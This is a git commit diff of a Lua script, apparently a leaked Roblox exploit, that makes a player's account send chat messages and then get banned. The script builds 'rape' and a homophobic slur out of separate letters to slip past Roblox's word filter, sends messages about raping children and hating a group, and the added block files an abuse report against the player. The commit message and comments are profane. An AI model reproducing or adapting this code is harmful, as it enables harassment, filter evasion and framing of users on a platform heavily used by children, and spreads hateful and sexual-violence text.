e8e8397d2566f3fed834a642e503713a8bd5353b
youngchongosreal <100457390+youngchongosreal@users.noreply.github.com>
2022-07-19 09:29:42 -0400

    fuck dwc on my life
    SHITTY

--- leaked-cr---roads-methods.lua
+++ leaked-cr---roads-methods.lua
@@ -26,6 +26,24 @@ local g = 'r' -- so it will say "rape"
 local d = 'a' -- but it won't get detected by Roblox
 local f = 'e' -- because if the word "rape" is in the model it'll get instantly taken down
 
+--[[
+example (this may not work):
+
+local Players = game:GetService'Players'
+local SayMessageRequest =
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+
+local a = 'f'
+local e = 't' 
+local c = 'g' -- this all rearranges the letters in "faggot"
+local b = 'a'
+local d = 'o'
+
+SayMessageRequest:FireServer('I hate '..a..b..c..c..d..e' so much and they piss me off!')
+task.wait(0.8) -- Waits 0.8 seconds to send the report
+Players:ReportAbuse(Players.LocalPlayer, 'Bullying', 'Bullying')
+]]--
+
 spawn(function() -- this requests to do the function
     while true do
         SayMessageRequest:FireServer('I '..g..d..a..f' children.') -- Tricks the game by putting ' a=p ' and all so it forms the word "rape"
@@ -40,4 +58,4 @@ Players.LocalPlayer:Kick() -- Kicks players after 8 seconds ( End of the loading
 
 -- CODE LEAKED BY 'k[39kb~¹1M×Drµ¿V|½)5M\ö*Ñ÷¿#3468', REWROTEN & EXPLAIN BY 'bbb#4444'
 
--- <3
+-- they gatekeeped 17 lines of code and took them 7 years to find this out. 7. the chat system has been abusable for 7 years and they didnt find this out until now.
